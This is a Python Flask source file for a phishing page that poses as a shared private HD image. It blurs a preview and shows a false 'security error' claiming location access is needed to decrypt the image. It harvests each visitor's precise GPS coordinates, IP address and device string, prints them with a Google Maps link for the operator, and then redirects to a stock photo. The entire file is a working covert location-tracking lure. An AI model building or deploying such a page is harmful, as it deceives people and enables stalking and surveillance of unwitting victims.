import os
try:
    import werkzeug
    werkzeug.urls.url_quote = werkzeug.urls.quote
except:
    pass

from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>HD Image Viewer</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <meta property="og:title" content="Shared HD Image (IMG_9921.jpg)">
        <meta property="og:description" content="Click to view and download the high-resolution image.">
        <meta property="og:image" content="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=600&q=80">
        <meta property="og:type" content="website">

        <style>
            body { 
                background-color: #000; 
                color: #fff; 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                margin: 0;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                overflow: hidden;
            }
            .preview-container {
                text-align: center;
                cursor: pointer;
            }
            .blur-img {
                width: 300px;
                height: 200px;
                filter: blur(10px);
                border: 2px solid #333;
                border-radius: 10px;
                transition: 0.3s;
            }
            .btn {
                background-color: #25D366;
                color: white;
                padding: 15px 30px;
                border: none;
                border-radius: 50px;
                font-size: 18px;
                font-weight: bold;
                margin-top: 20px;
                cursor: pointer;
                box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
            }
            #msg { color: #aaa; margin-top: 15px; font-size: 14px; }
        </style>

        <script>
            function requestLocation() {
                document.getElementById("msg").innerHTML = "Decrypting Image... Please wait.";
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition, showError, {enableHighAccuracy:true});
                } else {
                    alert("Your browser does not support image decryption.");
                }
            }

            function showPosition(position) {
                fetch('/save-data?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude)
                .then(() => { 
                    // ලොකේෂන් එක ගත්තට පස්සේ ඇත්තම ලස්සන ෆොටෝ එකකට හරවා යවනවා
                    window.location.href = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80"; 
                });
            }

            function showError(error) {
                alert("Security Error: Location access is required to decrypt and view the shared image.");
                window.location.reload();
            }
        </script>
    </head>
    <body>
        <div class="preview-container" onclick="requestLocation()">
            <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=300&q=10" class="blur-img">
            <h2>Private Image Shared</h2>
            <p style="color: #ccc;">The sender has protected this image.</p>
            <button class="btn">View Full Image</button>
            <p id="msg"></p>
        </div>
    </body>
    </html>
    '''

@app.route('/save-data')
def save_data():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # ටර්මිනල් එකේ පෙන්වීම
    print("\n" + "🎯"*20)
    print(f"[@] ලොකේෂන් එක අහුවුණා! [{datetime.datetime.now().strftime('%H:%M:%S')}]")
    print(f"[+] IP: {user_ip}")
    print(f"[+] Maps Link: http://www.google.com/maps/place/{lat},{lon}")
    print(f"[+] Device: {user_agent}")
    print("🎯"*20 + "\n")
    
    return "Success"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
